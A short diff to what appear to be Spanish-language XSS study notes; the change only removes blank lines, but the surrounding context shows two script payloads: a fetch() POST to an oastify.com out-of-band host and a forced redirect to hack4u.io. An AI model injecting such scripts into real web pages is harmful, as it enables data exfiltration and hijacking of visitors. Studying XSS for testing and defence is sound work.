@@ -46,8 +46,6 @@ Los XSS pueden interpretar código en **HTML y/o  JavaScript** y es ahí en dond
 <script>                                                     /// Para mandar algo por el metodo POST a un dominio 
   fetch('https://kwklry4t8e18m8q8k5uikgydy44vslga.oastify.com',{method:'POST', mode:'no-cors', body:'omar'});
 </script>
-
-
 ```
 
 ----
@@ -120,8 +118,6 @@ Podemos crear un Script para redirigir al usuario
 	window.location.href = "https://hack4u.io";
 </script>
 ```
-
-
 
 ## JavaScript 
 
